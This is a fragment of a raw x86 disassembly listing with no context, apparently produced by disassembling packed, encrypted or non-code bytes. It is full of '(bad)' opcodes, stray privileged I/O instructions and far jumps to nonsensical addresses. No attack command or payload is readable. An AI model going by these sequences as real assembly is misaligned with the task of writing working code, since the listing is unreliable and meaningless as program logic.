  40574f:	jbe    0x405798
  405751:	iret   
  405752:	(bad)  
  405753:	fld    TBYTE PTR [eax+0x3d7a1951]
  405759:	push   eax
  40575a:	lea    ebx,[ebx-0x22]
  40575d:	pop    ecx
  40575e:	arpl   WORD PTR [ebx-0x62],di
  405761:	(bad)  
  405762:	dec    ecx
  405763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405764:	(bad)  
  405765:	jbe    0x40579f
  405767:	cmp    dh,BYTE PTR [ecx-0x3c]
  40576a:	cli    
  40576b:	repz cmp edi,DWORD PTR [edx-0x358b9ca2]
  405772:	adc    eax,0x2b7f295b
  405777:	sahf   
  405778:	dec    edi
  405779:	or     ch,BYTE PTR [ebp-0x44fd17d4]
  40577f:	retf   0x9287
  405782:	int3   
  405783:	retf   0x1e4d
  405786:	xlat   BYTE PTR ds:[ebx]
  405787:	adc    ebx,DWORD PTR [ebx]
  405789:	loope  0x4057fa
  40578b:	in     al,dx
  40578c:	xlat   BYTE PTR ds:[ebx]
  40578d:	and    al,0xd9
  40578f:	imul   ebx,DWORD PTR [ebx-0x44c1421e],0x3a1b6696
  405799:	stos   BYTE PTR es:[edi],al
  40579a:	(bad)  
  40579b:	xchg   BYTE PTR [eax+0x56],bh
  40579e:	sbb    edi,DWORD PTR [ecx]
  4057a0:	add    BYTE PTR [edi-0x53],bh
  4057a3:	ret    0x916f
  4057a6:	daa    
  4057a7:	jecxz  0x4057f0
  4057a9:	jae    0x4057f8
  4057ab:	lds    esp,FWORD PTR [edx]
  4057ad:	aas    
  4057ae:	mov    WORD PTR [eax-0x73],ds
  4057b1:	jp     0x4057cf
  4057b3:	sbb    ah,BYTE PTR [ecx-0x22ba24db]
  4057b9:	jg     0x40574e
  4057bb:	add    DWORD PTR [ecx+0x375d1acf],ecx
  4057c1:	sbb    ebx,ebx
  4057c3:	mov    al,ds:0x22cdab78
  4057c8:	pop    eax
  4057c9:	call   0x3bf69019
  4057ce:	icebp  
  4057cf:	(bad)  
  4057d0:	lods   eax,DWORD PTR ds:[esi]
  4057d1:	fwait
  4057d2:	inc    esp
  4057d3:	push   esp
  4057d4:	fild   DWORD PTR [edi-0x6c]
  4057d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057d8:	dec    esp
  4057d9:	pop    edx
  4057da:	shr    DWORD PTR [ebp*2-0x46dcf126],cl
  4057e1:	mov    ss,WORD PTR [eax]
  4057e3:	xchg   esp,eax
  4057e4:	retf   
  4057e5:	xchg   DWORD PTR [edi+0x6],esp
  4057e8:	jbe    0x40580d
  4057ea:	cmp    esp,DWORD PTR [ecx+0x6f]
  4057ed:	adc    DWORD PTR [edx+0x68],ebx
  4057f0:	popa   
  4057f1:	aam    0xc9
  4057f3:	jecxz  0x4057a6
  4057f5:	int    0x8b
  4057f7:	fimul  DWORD PTR [ebp+edx*8-0x50]
  4057fb:	pop    ecx
  4057fc:	mov    cl,0x42
  4057fe:	xor    BYTE PTR [edi-0x40e86698],al
  405804:	in     al,dx
  405805:	sbb    edx,DWORD PTR [esp+edi*4-0x5107c2f2]
  40580c:	sbb    eax,0xe56292cb
  405811:	push   ds
  405812:	xchg   edi,eax
  405813:	cs pop eax
  405815:	xchg   BYTE PTR [ecx+0x1f],bl
  405818:	pop    ds
  405819:	push   esi
  40581a:	sti    
  40581b:	ds ja  0x40589b
  40581e:	or     eax,ecx
  405820:	mov    esi,DWORD PTR [edx]
  405822:	add    bl,BYTE PTR [ebp-0x72]
  405825:	jmp    0x517d:0x22cf1b6c
  40582c:	(bad)  
  40582d:	lock push ebp
  40582f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405830:	and    DWORD PTR [ebx-0x2c],ebp
  405833:	aas    
  405834:	inc    edi
  405835:	cmp    eax,0x72a191ff
  40583a:	pop    ss
  40583b:	push   ebx
  40583c:	dec    eax
  40583d:	ret    0x6c5d
  405840:	(bad)  
  405841:	xor    al,0x1b
  405843:	lea    ebx,[eax-0x14]
  405846:	pop    esp
  405847:	jmp    0x4058ac
  405849:	add    al,0x4
  40584b:	call   0x6e6e:0x7bebc76e
  405852:	xor    al,0x40
  405854:	cmp    DWORD PTR ds:0x46417f9f,edi
  40585a:	sbb    bh,0x8e
  40585d:	fisub  WORD PTR [ecx+0x3976907d]
  405863:	add    cl,dh
  405865:	loope  0x4058cf
  405867:	cmp    eax,0x990e01e5
  40586c:	stos   DWORD PTR es:[edi],eax
  40586d:	call   0x6748:0x4cc6cadb
  405874:	ins    DWORD PTR es:[edi],dx
  405875:	or     al,0xd3
  405877:	add    eax,0x43c60d67
  40587c:	imul   edx,DWORD PTR [ebx-0x57],0x65e5e7a9
  405883:	push   ebp
  405884:	js     0x40585a
  405886:	pop    esp
  405887:	lock out dx,eax
  405889:	xor    ah,BYTE PTR [esp+eax*1+0x47e8a212]
  405890:	dec    ebp
  405891:	inc    esp
  405892:	cdq    
  405893:	inc    ebx
  405894:	inc    ebp
  405895:	daa    
  405896:	inc    esp
  405897:	ds push edi
  405899:	mov    BYTE PTR [eax-0x44],ah
  40589c:	pop    esi
  40589d:	pop    esi
  40589e:	xchg   DWORD PTR [esi+0x3d34f7c2],edi
  4058a4:	push   esp
  4058a5:	pop    edx
  4058a6:	xor    eax,0x90779606
  4058ab:	xchg   ecx,eax
  4058ac:	fstp   QWORD PTR [ecx-0x67]
  4058af:	nop
  4058b0:	jbe    0x405884
  4058b2:	mov    edx,0x953fb333
  4058b7:	sbb    BYTE PTR [eax-0x12815ce0],bl
  4058bd:	int    0xb0
  4058bf:	push   es
  4058c0:	outs   dx,DWORD PTR ds:[esi]
  4058c1:	mov    al,0x78
  4058c3:	or     dl,0xb5
  4058c6:	aaa    
  4058c7:	push   ecx
  4058c8:	scas   eax,DWORD PTR es:[edi]
  4058c9:	mov    eax,DWORD PTR ds:0x4f25c61e
  4058cf:	(bad)  
  4058d0:	lock scas al,BYTE PTR es:[edi]
  4058d2:	(bad)  [esi-0x17]
  4058d5:	int3   
  4058d6:	popf   
  4058d7:	aad    0x7a
  4058d9:	aaa    
  4058da:	int    0x99
  4058dc:	nop
  4058dd:	xor    al,0xec
  4058df:	jae    0x405878
  4058e1:	pop    eax
  4058e2:	or     al,0x8a
  4058e4:	cmp    DWORD PTR gs:[ebx],ebx
  4058e7:	stc    
  4058e8:	loop   0x405945
  4058ea:	(bad)  
  4058eb:	cld    
  4058ec:	xchg   esi,edx
  4058ee:	(bad)  
  4058f0:	jecxz  0x405931
  4058f2:	mov    cl,0x34
  4058f4:	sub    ebp,esp
  4058f6:	mov    gs,WORD PTR [edi+0x6224e15b]
  4058fc:	sbb    DWORD PTR [ecx+esi*8],ecx
  4058ff:	aas    
  405900:	dec    edx
  405901:	out    0xa2,al
  405903:	jmp    0x58bccb2c
  405908:	jae    0x405984
  40590a:	sar    DWORD PTR [esi+0x3c],0x51
  40590e:	dec    DWORD PTR ds:0x856a857a
  405914:	fist   DWORD PTR [esi]
  405916:	xor    BYTE PTR [ecx],ah
  405918:	in     eax,0xd1
  40591a:	sbb    DWORD PTR [esi+0x62],esp
  40591d:	cld    
  40591e:	sbb    al,BYTE PTR [esi-0x7d]
  405921:	mov    BYTE PTR [edi],0x42
  405924:	dec    DWORD PTR [ebx+eiz*8]
  405927:	dec    ebx
  405928:	inc    esp
  405929:	sub    eax,0x1bdf4970
  40592e:	neg    BYTE PTR [eax]
  405930:	add    eax,0x77
  405933:	xor    al,0x5b
  405935:	cwde   
  405936:	in     eax,0x29
  405938:	shr    esp,1
  40593a:	(bad)  
  40593b:	mov    ecx,0xc0ef6eaf
  405940:	sub    ch,ah
  405942:	repz test BYTE PTR [ebx-0xae321ea],al
  405949:	jmp    0x678b:0xdb31c57f
  405950:	scas   al,BYTE PTR es:[edi]
  405951:	out    0x7f,al
  405953:	gs mov ebx,0xdde9ccd
  405959:	mov    WORD PTR [ebx],?
  40595b:	test   eax,0x21aae6e3
  405960:	push   cs
  405961:	fwait
  405962:	shr    DWORD PTR [esi],cl
  405964:	in     eax,0x94
  405966:	cdq    
  405967:	clc    
  405968:	enter  0x547c,0xee
  40596c:	in     eax,dx
  40596d:	std    
  40596e:	add    al,0x75
  405970:	or     eax,0xadf63d18
  405975:	sub    BYTE PTR [ebp-0x4d9b777f],bl
  40597b:	fist   WORD PTR [edi-0x615213bb]
  405981:	pusha  
  405982:	fisubr WORD PTR [ebp+0xf]
  405985:	add    eax,0xae62c082
  40598a:	pop    esi
  40598b:	mov    esi,0x5bfbcbc9
  405990:	cmp    ch,BYTE PTR [ebp-0x3fb82c89]
  405996:	sbb    dh,BYTE PTR [eax]
  405998:	push   ds
  405999:	xor    ch,BYTE PTR [edi+0x11fe8e04]
  40599f:	dec    ecx
  4059a0:	inc    edi
  4059a1:	add    edi,DWORD PTR [ebx+0x7a]
  4059a4:	ins    BYTE PTR es:[edi],dx
  4059a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a6:	jne    0x405940
  4059a8:	into   
  4059a9:	xchg   edi,eax
  4059aa:	int    0xc4
  4059ac:	(bad)  
  4059ad:	repz inc ecx
  4059af:	outs   dx,BYTE PTR ds:[esi]
  4059b0:	sub    BYTE PTR [esi],ch
  4059b2:	loopne 0x405945
  4059b4:	pusha  
  4059b5:	dec    ebx
  4059b6:	mov    ds:0xca7c66dd,al
  4059bb:	in     eax,0x14
  4059bd:	push   ss
  4059be:	lea    edi,[eax-0x24e071cf]
  4059c4:	call   0x91534c
  4059c9:	or     DWORD PTR ds:0xe89cd8c0,ecx
  4059cf:	data16 and BYTE PTR [edx+0x22],0x5c
  4059d4:	dec    edx
  4059d5:	push   ecx
  4059d6:	in     eax,0xfa
  4059d8:	dec    edi
  4059d9:	push   0x6d
  4059db:	mov    ah,0x14
  4059dd:	xchg   ecx,eax
  4059de:	mov    dh,0xb3
  4059e0:	sub    bl,BYTE PTR [si-0x47ce]
  4059e5:	jb     0x405a12
  4059e7:	mov    ds:0xa2bb3883,eax
  4059ec:	add    DWORD PTR ds:0xef62262,ebp
  4059f2:	or     bl,BYTE PTR [esi]
  4059f4:	mov    edx,esp
  4059f6:	int    0xe2
  4059f8:	pop    ss
  4059f9:	mov    esi,0x82938cbe
  4059fe:	inc    edi
  4059ff:	add    BYTE PTR [edx+0x3d770229],dl
  405a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a06:	out    dx,eax
  405a07:	dec    esp
  405a08:	inc    edi
  405a09:	inc    ebx
  405a0a:	pusha  
  405a0b:	inc    ecx
  405a0c:	and    ecx,DWORD PTR [edi-0x2c]
  405a0f:	xchg   esi,eax
  405a10:	push   edx
  405a11:	cdq    
  405a12:	pusha  
  405a13:	mov    ds:0x59ad4221,eax
  405a18:	push   edx
  405a19:	dec    eax
  405a1a:	mov    al,0x69
  405a1c:	and    al,dh
  405a1e:	rcl    DWORD PTR [ecx+0x56],cl
  405a21:	and    ch,BYTE PTR [eax-0x40b852b8]
  405a27:	ss pop edi
  405a29:	cmp    eax,DWORD PTR [edx+0x0]
  405a2c:	in     al,dx
  405a2d:	popf   
  405a2e:	add    esi,eax
  405a30:	xor    DWORD PTR [ecx+edx*2-0xf],edi
  405a34:	xor    al,0x9b
  405a36:	jmp    FWORD PTR [eax-0x424c16fe]
  405a3c:	jb     0x405a30
  405a3e:	call   0x521d:0xd797b8e9
  405a45:	mov    al,ds:0xf4606d59
  405a4a:	mov    esi,DWORD PTR [ebp+0x11]
  405a4d:	sub    ch,ah
  405a4f:	push   ecx
  405a50:	add    BYTE PTR [eax],dl
  405a52:	xor    DWORD PTR [edx-0x7f],edx
  405a55:	jns    0x405a17
  405a57:	cdq    
  405a58:	and    DWORD PTR [ebp-0x43],esi
  405a5b:	fst    QWORD PTR [edx+0x67]
  405a5e:	mov    ebp,0xcbc18fac
  405a63:	xor    eax,0xbdf9410b
  405a68:	fcomp  DWORD PTR [esi]
  405a6a:	stc    
  405a6b:	or     eax,0x2713152
  405a70:	mov    ebp,0x287a46e4
  405a75:	hlt    
  405a76:	pushf  
  405a77:	in     eax,dx
  405a78:	in     al,dx
  405a79:	xor    al,BYTE PTR [ecx+ebx*1+0x6485e745]
  405a80:	sbb    eax,edi
  405a82:	inc    ebp
  405a83:	mov    edx,0xf5d0a5f9
  405a88:	mov    esi,0x8ebc8dae
  405a8d:	dec    esi
  405a8e:	pop    ebp
  405a8f:	push   esp
  405a90:	adc    al,0x9c
  405a92:	rcl    BYTE PTR [edx],cl
  405a94:	aad    0xe1
  405a96:	out    dx,eax
  405a97:	mov    dh,0x1c
  405a99:	dec    ecx
  405a9a:	pop    ds
  405a9b:	jbe    0x405a8d
  405a9d:	jg     0x405b15
  405a9f:	adc    DWORD PTR [ebp+0x2],edi
  405aa2:	adc    al,0x72
  405aa4:	push   ebx
  405aa5:	fadd   st(5),st
  405aa7:	je     0x405a53
  405aa9:	ret    0xfd62
  405aac:	lahf   
  405aad:	or     al,0x2c
  405aaf:	cmp    ecx,eax
  405ab1:	bound  ebx,QWORD PTR [ecx-0x60503c5d]
  405ab7:	jne    0x405b0e
  405ab9:	jne    0x405a5d
  405abb:	and    eax,0xf3604cec
  405ac0:	enter  0x7d64,0x18
  405ac4:	xchg   BYTE PTR [edx+ebx*1+0x14],ah
  405ac8:	js     0x405a8d
  405aca:	pop    es
  405acb:	out    0xe9,eax
  405acd:	fldcw  WORD PTR [edx-0x97d08e0]
  405ad3:	pop    esi
  405ad4:	aad    0x9a
  405ad6:	jecxz  0x405a62
  405ad8:	adc    eax,0x650537a4
  405add:	xor    ecx,eax
  405adf:	dec    esi
  405ae0:	sub    eax,0x727b33ca
  405ae5:	ins    DWORD PTR es:[edi],dx
  405ae6:	inc    ecx
  405ae7:	mov    ebx,0x557487e0
  405aec:	in     al,dx
  405aed:	icebp  
  405aee:	adc    BYTE PTR [ebx],dl
  405af0:	inc    esp
  405af1:	pop    ss
  405af2:	jae    0x405af4
  405af4:	sahf   
  405af5:	out    0x7d,eax
  405af7:	sub    bh,al
  405af9:	shl    DWORD PTR [edx+0xd],1
  405afc:	out    dx,al
  405afd:	cmp    eax,0x262de3e8
  405b02:	dec    ecx
  405b03:	push   ebp
  405b04:	add    ah,al
  405b06:	pop    ss
  405b07:	inc    edx
  405b08:	mov    BYTE PTR [esi+eiz*1+0x6c35f92],al
  405b0f:	sub    al,dh
  405b11:	int    0xa1
  405b13:	cli    
  405b14:	rcl    DWORD PTR [ebx],1
  405b16:	push   eax
  405b17:	add    edi,DWORD PTR [edx]
  405b19:	lods   eax,DWORD PTR ds:[esi]
  405b1a:	push   edx
  405b1b:	loopne 0x405b09
  405b1d:	lahf   
  405b1e:	nop
  405b1f:	jno    0x405ada
  405b21:	call   0x1a43ed2e
  405b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b27:	and    edi,DWORD PTR [ebp-0x6d]
  405b2a:	jmp    0x405b41
  405b2c:	xor    ebp,DWORD PTR [esi]
  405b2e:	push   ds
  405b2f:	jno    0x405b83
  405b31:	push   es
  405b32:	icebp  
  405b33:	add    ebx,esp
  405b35:	fs or  eax,0xa7bf8e29
  405b3b:	sbb    dl,BYTE PTR [ebp+0x3c647435]
  405b41:	mov    al,0xc2
  405b43:	push   0xffffffda
  405b45:	stos   BYTE PTR es:[edi],al
  405b46:	push   ecx
  405b47:	shl    BYTE PTR [ecx-0x392d935f],0x8
  405b4e:	fist   DWORD PTR [edx+0x26]
  405b51:	or     BYTE PTR [eax+0xb],0x9
  405b55:	test   al,0xf2
  405b57:	ins    DWORD PTR es:[edi],dx
  405b58:	mov    esi,0x2c8fbaef
  405b5d:	popa   
  405b5e:	ret    0xd40c
  405b61:	add    bh,ah
  405b63:	(bad)  
  405b64:	icebp  
  405b65:	push   ebp
  405b66:	daa    
  405b67:	unpckhps xmm0,xmm0
  405b6a:	addr16 inc esi
  405b6c:	out    dx,eax
  405b6d:	pop    esp
  405b6e:	push   edi
  405b6f:	jne    0x405b73
  405b71:	rcl    BYTE PTR [ebp+0x18181c5c],cl
  405b77:	fistp  WORD PTR ds:0xafb9ed46
  405b7d:	arpl   WORD PTR [ecx-0x10af1b5],bx
  405b83:	in     al,dx
  405b84:	xchg   DWORD PTR [edx+0x58],ecx
  405b87:	sbb    eax,0x60686474
  405b8c:	sbb    al,0xf5
  405b8e:	mov    esp,DWORD PTR [eax]
  405b90:	adc    eax,esi
  405b92:	jp     0x405b94
  405b94:	adc    al,0x66
  405b96:	jbe    0x405b53
  405b98:	das    
  405b99:	std    
  405b9a:	pop    esp
  405b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b9c:	or     dl,BYTE PTR [ebx-0x62]
  405b9f:	popa   
  405ba0:	add    edi,DWORD PTR [eax]
  405ba2:	xchg   ebx,eax
  405ba3:	pop    edi
  405ba4:	add    ebp,DWORD PTR [ecx]
  405ba6:	add    BYTE PTR [eax-0x31],dl
  405ba9:	push   0xb79d8ff3
  405bae:	test   BYTE PTR [eax+0x25],dl
  405bb1:	pop    eax
  405bb2:	push   cs
  405bb3:	pushf  
  405bb4:	in     al,dx
  405bb5:	dec    ebp
  405bb6:	int3   
  405bb7:	and    cl,dh
  405bb9:	cld    
  405bba:	cmp    ebx,DWORD PTR ss:[esi+0x6f]
  405bbe:	test   bh,dl
  405bc0:	ja     0x405b9d
  405bc2:	mov    edi,0xbf1e442f
  405bc7:	fidiv  WORD PTR [ebx+ecx*8+0x5d7866f]
  405bce:	mov    ebp,0x96585045
  405bd3:	gs into 
  405bd5:	test   DWORD PTR [esi-0x40],0xe9c3d09c
  405bdc:	enter  0xbff2,0xc3
  405be0:	mov    ds:0x264b4853,eax
  405be5:	xor    DWORD PTR [edx-0x4f],ecx
  405be8:	dec    edi
  405be9:	push   ecx
  405bea:	push   ebx
  405beb:	mov    ah,0x5c
  405bed:	inc    esp
  405bee:	jmp    0x405c5a
  405bf0:	ret    0x7b92
  405bf3:	mov    ah,0x12
  405bf5:	retf   
  405bf6:	ss push esp
  405bf8:	call   FWORD PTR [ebx]
  405bfa:	aad    0x9b
  405bfc:	pop    ebp
  405bfd:	jns    0x405c67
  405bff:	lahf   
  405c00:	jo     0x405b89
  405c02:	or     DWORD PTR [eax+0x73cf3faa],esp
  405c08:	fidiv  DWORD PTR ds:[esi+edx*2-0x4c]
  405c0d:	je     0x405c83
  405c0f:	dec    esp
  405c10:	and    ah,dh
  405c12:	into   
  405c13:	mov    esi,0x2e57c853
  405c18:	add    ch,BYTE PTR [esi]
  405c1a:	popf   
  405c1b:	sbb    al,0x97
  405c1d:	popa   
  405c1e:	mov    ebp,0xd5931668
  405c23:	shl    bh,cl
  405c25:	pop    ss
  405c26:	inc    ebp
  405c27:	adc    eax,0x281891f3
  405c2c:	jne    0x405ca5
  405c2e:	sti    
  405c2f:	icebp  
  405c30:	xchg   ebx,eax
  405c31:	mov    edx,0x917e57cb
  405c36:	pop    ebx
  405c37:	xchg   ebp,eax
  405c38:	mov    dl,0x9c
  405c3a:	retf   
  405c3b:	mov    bl,0x1f
  405c3d:	and    eax,0x1ef11f39
  405c42:	xchg   esi,eax
  405c43:	or     cl,BYTE PTR [edi+ecx*2-0x35]
  405c47:	dec    ebx
  405c48:	mov    dh,0x15
  405c4a:	das    
  405c4b:	outs   dx,BYTE PTR ds:[esi]
  405c4c:	mov    eax,ds:0xc758dbb8
  405c51:	and    DWORD PTR [ebp-0x12],esp
  405c54:	imul   eax,edi,0xe718eac7
  405c5a:	dec    esp
  405c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c5c:	and    DWORD PTR [edx+0x1750e9ac],esi
  405c62:	cmp    al,0x85
  405c64:	push   ebp
  405c65:	in     eax,0x93
  405c67:	daa    
  405c68:	(bad)  
  405c69:	ds (bad) 
  405c6b:	enter  0x2749,0xd0
  405c6f:	sub    eax,0xea9eed18
  405c74:	mov    bh,BYTE PTR [esi-0x34]
  405c77:	fdivr  DWORD PTR [ebp-0xeeb7d39]
  405c7d:	std    
  405c7e:	xor    eax,0xc0528fbe
  405c83:	mov    ds:0x56e07abc,eax
  405c88:	addr16 cli 
  405c8a:	mov    eax,ebp
  405c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c8d:	dec    esi
  405c8e:	adc    esi,DWORD PTR [eax-0xc]
  405c91:	push   edi
  405c92:	xor    cl,BYTE PTR [ecx-0x771d5fd8]
  405c98:	stc    
  405c99:	icebp  
  405c9a:	dec    esi
  405c9b:	pusha  
  405c9c:	mov    ds:0x925a87f3,eax
  405ca1:	inc    ebp
  405ca2:	jl     0x405c56
  405ca4:	pop    ss
  405ca5:	nop
  405ca6:	cli    
  405ca7:	ret    0x7fd0
  405caa:	jmp    0x405ccb
  405cac:	adc    eax,DWORD PTR [edx+0x6d50cc6d]
  405cb2:	and    eax,0x3bc62b5c
  405cb7:	popa   
  405cb8:	or     BYTE PTR [esi],al
  405cba:	jle    0x405d20
  405cbc:	les    esi,FWORD PTR [edx-0x79c3b4b]
  405cc2:	inc    edx
  405cc3:	cmp    ecx,0xec781227
  405cc9:	lea    ebx,[ebp-0x49]
  405ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ccd:	fwait
  405cce:	mov    dl,0x48
  405cd0:	or     esp,DWORD PTR [edi]
  405cd2:	add    edi,esi
  405cd4:	cmp    DWORD PTR [eax-0x5318a60c],ecx
  405cda:	push   cs
  405cdb:	jle    0x405ca6
  405cdd:	jge    0x405c71
  405cdf:	mov    al,ds:0x54f6c816
  405ce4:	ins    BYTE PTR es:[edi],dx
  405ce5:	imul   esp,DWORD PTR [esi-0x55],0x980aa3bd
  405cec:	mov    ds:0xfa20d05f,eax
  405cf1:	je     0x405cd2
  405cf3:	push   ebp
  405cf4:	loop   0x405cd5
  405cf6:	fcomp  st(1)
  405cf8:	bnd jno 0x405ca0
  405cfb:	push   ebx
  405cfc:	es loope 0x405d37
  405cff:	ds mov esi,fs
  405d02:	sub    al,0x7d
  405d04:	addr16 in eax,dx
  405d06:	xchg   esi,eax
  405d07:	rcl    BYTE PTR [edx],1
  405d09:	hlt    
  405d0a:	add    DWORD PTR [eax-0x739bac61],0x7fd31055
  405d14:	shr    DWORD PTR [esp+eiz*8+0x53a20913],0x39
  405d1c:	cdq    
  405d1d:	scas   eax,DWORD PTR es:[edi]
  405d1e:	arpl   bp,di
  405d20:	inc    ebp
  405d21:	call   0x1474:0xe56e6b37
  405d28:	imul   ebx,eax,0x1c688f4e
  405d2e:	xor    dh,dh
  405d30:	mov    dl,BYTE PTR [esi-0x80]
  405d33:	and    dl,al
  405d35:	mov    esi,0x2578aa05
  405d3a:	pop    edi
  405d3b:	pop    esi
  405d3c:	ja     0x405d4d
  405d3e:	ja     0x405d4c
  405d40:	cmp    eax,DWORD PTR [eax-0x45]
  405d43:	add    ch,al
  405d45:	stos   BYTE PTR es:[edi],al
  405d46:	cmp    DWORD PTR [edx+0x14c98e08],edi
  405d4c:	add    al,0x16
  405d4e:	and    BYTE PTR [ecx-0x70],dl
  405d51:	pop    ebx
  405d52:	mov    dh,0x38
  405d54:	stos   DWORD PTR es:[edi],eax
  405d55:	add    BYTE PTR ds:0x69f42329,0xd8
  405d5c:	jno    0x405d85
  405d5e:	pusha  
  405d5f:	ret    0xd71a
  405d62:	retf   0x51ff
  405d65:	or     eax,0xe87a99c3
  405d6a:	sub    DWORD PTR [ebp-0x2f6b6175],esp
  405d70:	or     dh,dl
  405d72:	not    BYTE PTR [edx*2+0xf172e74]
  405d79:	bound  edi,QWORD PTR [ebp+ebx*4-0x65424b6b]
  405d80:	xor    eax,0x6e2f0b87
  405d85:	mov    edi,0xb6201868
  405d8a:	inc    ecx
  405d8b:	int    0x8f
  405d8d:	dec    ebp
  405d8f:	(bad)  
  405d90:	das    
  405d91:	inc    esi
  405d92:	aam    0x7c
  405d94:	inc    ecx
  405d95:	fist   WORD PTR [eax+edx*2+0x26]
  405d99:	leave  
  405d9a:	pop    edx
  405d9b:	add    eax,0xb7be3468
  405da0:	cli    
  405da1:	nop
  405da2:	mov    bl,0x79
  405da4:	in     eax,0x79
  405da6:	outs   dx,BYTE PTR ds:[esi]
  405da7:	ss ins DWORD PTR es:[edi],dx
  405da9:	and    eax,0xcb71a868
  405dae:	jl     0x405dc9
  405db0:	mov    esp,0xd4032fa2
  405db5:	test   al,0xc9
  405db7:	push   edi
  405db8:	inc    esi
  405db9:	jl     0x405d4d
  405dbb:	xchg   BYTE PTR [ecx],dh
  405dbd:	das    
  405dbe:	in     al,0x97
  405dc0:	push   ds
  405dc1:	push   ecx
  405dc2:	inc    esp
  405dc3:	int3   
  405dc4:	pop    edi
  405dc5:	xchg   edx,eax
  405dc6:	and    esi,DWORD PTR [ebx]
  405dc8:	push   ebp
  405dc9:	call   0xadf5037a
  405dce:	jmp    0x405dd9
  405dd0:	inc    esp
  405dd1:	xchg   ebx,eax
  405dd2:	jae    0x405dcf
  405dd4:	(bad)  
  405dd5:	sub    eax,0x23f9b44e
  405dda:	bound  eax,QWORD PTR [esi-0x33e74d2d]
  405de0:	lods   eax,DWORD PTR ds:[esi]
  405de1:	test   BYTE PTR [ebp-0x4d970d98],ah
  405de7:	int    0x55
  405de9:	add    ebp,DWORD PTR [eax-0x1a91a237]
  405def:	and    edi,edi
  405df1:	mov    eax,0xc2c2c83
  405df6:	or     DWORD PTR [ebx+0x1b1617c2],esp
  405dfc:	popa   
  405dfd:	xor    DWORD PTR [ecx+0x31],ebp
  405e00:	jmp    0x14b4:0x1e8713bd
  405e07:	inc    edi
  405e08:	pusha  
  405e09:	pop    esp
  405e0a:	and    eax,0x9c189dbd
  405e0f:	xor    al,0x3d
  405e11:	hlt    
  405e12:	outs   dx,BYTE PTR ds:[esi]
  405e13:	repz jno 0x405e82
  405e16:	pop    ss
  405e17:	aam    0x7b
  405e19:	pop    ebx
  405e1a:	test   DWORD PTR [ecx+0x3a],edx
  405e1d:	mov    fs,WORD PTR [ebp+eiz*2+0x15]
  405e21:	push   ebp
  405e22:	fldenv [ecx-0x5e]
  405e25:	push   0x8664ec4
  405e2a:	and    ch,dh
  405e2c:	jo     0x405e02
  405e2e:	inc    eax
  405e2f:	in     eax,dx
  405e30:	adc    eax,0xd5b2cf17
  405e35:	jns    0x405e2e
  405e37:	dec    esi
  405e38:	sub    al,BYTE PTR [ebp-0x12201c3f]
  405e3e:	mov    al,ds:0xeb9cc7bb
  405e43:	xchg   ecx,eax
  405e44:	dec    edi
  405e45:	mov    bl,0x92
  405e47:	loop   0x405e17
  405e49:	cdq    
  405e4a:	adc    BYTE PTR es:[ebx],dl
  405e4d:	add    BYTE PTR [esi],0x3f
  405e50:	adc    DWORD PTR [edi*2+0x2ee7b922],ebx
  405e57:	(bad)  
  405e59:	push   esp
  405e5a:	ror    DWORD PTR es:[ebp-0x972ab72],cl
  405e61:	add    edi,DWORD PTR [ebx+0x568ae763]
  405e67:	xor    al,0x6a
  405e69:	enter  0x1847,0xac
  405e6d:	iret   
  405e6e:	cwde   
  405e6f:	mov    bl,0x8e
  405e71:	aam    0x63
  405e73:	mov    ?,WORD PTR ds:0x53f588f1
  405e79:	adc    al,0xf0
  405e7b:	aas    
  405e7c:	xchg   ebp,eax
  405e7d:	pop    edx
  405e7e:	(bad)  
  405e7f:	cli    
  405e80:	pushw  0x8170
  405e84:	push   esi
  405e85:	imul   edi,DWORD PTR [esp+eax*1-0x38],0x1ff6da55
  405e8d:	xchg   DWORD PTR [edi-0x4177a456],esp
  405e93:	add    DWORD PTR [edx-0x292270e5],edx
  405e99:	xor    DWORD PTR [ebx],edx
  405e9b:	aas    
  405e9c:	jns    0x405e82
  405e9e:	popf   
  405e9f:	inc    eax
  405ea0:	add    eax,edx
  405ea2:	(bad)  
  405ea3:	sub    ebx,DWORD PTR [eax]
  405ea5:	in     eax,0x70
  405ea7:	sbb    DWORD PTR [ebp-0x6e3ddd71],ebx
  405ead:	mov    bh,0x31
  405eaf:	popa   
  405eb0:	mov    al,ds:0xfcd8f198
  405eb5:	inc    esi
  405eb6:	dec    edi
  405eb7:	sbb    cl,BYTE PTR [eax+0x4a2e0187]
  405ebd:	mov    dl,0x9a
  405ebf:	xor    ebx,esi
  405ec1:	neg    BYTE PTR [eax-0x2c905116]
  405ec7:	mov    WORD PTR [edx+0x71d6b540],es
  405ecd:	adc    al,0x97
  405ecf:	test   al,0x8a
  405ed1:	fmulp  st(3),st
  405ed3:	jmp    0x5d47:0xe53baf4c
  405eda:	je     0x405f4a
  405edc:	test   eax,0x74165041
  405ee1:	cld    
  405ee2:	xchg   edx,eax
  405ee3:	aad    0x3c
  405ee5:	mov    DWORD PTR [esi-0x42],esi
  405ee8:	data16 or BYTE PTR [ebp+0x3d],ch
  405eec:	ins    DWORD PTR es:[edi],dx
  405eed:	adc    dl,BYTE PTR [edi+0x3f]
  405ef0:	aas    
  405ef1:	xchg   edx,eax
  405ef2:	xchg   ebp,eax
  405ef3:	popa   
  405ef4:	stos   BYTE PTR es:[edi],al
  405ef5:	sahf   
  405ef6:	mov    ch,0x6a
  405ef8:	rol    DWORD PTR [edi+0x375462e8],1
  405efe:	dec    ecx
  405eff:	push   ebp
  405f00:	imul   esp,eax,0x2db2b8c1
  405f06:	add    eax,0xd77f481d
  405f0b:	js     0x405ec2
  405f0d:	mulps  xmm6,XMMWORD PTR [eax+0x6e7e26f7]
  405f14:	pop    edx
  405f15:	push   0xffffff96
  405f17:	cs jg  0x405f55
  405f1a:	inc    ebx
  405f1b:	jb     0x405f54
  405f1d:	lea    ebx,[edi-0x73]
  405f20:	dec    ebx
  405f21:	xchg   ecx,eax
  405f22:	mov    dh,0xc3
  405f24:	into   
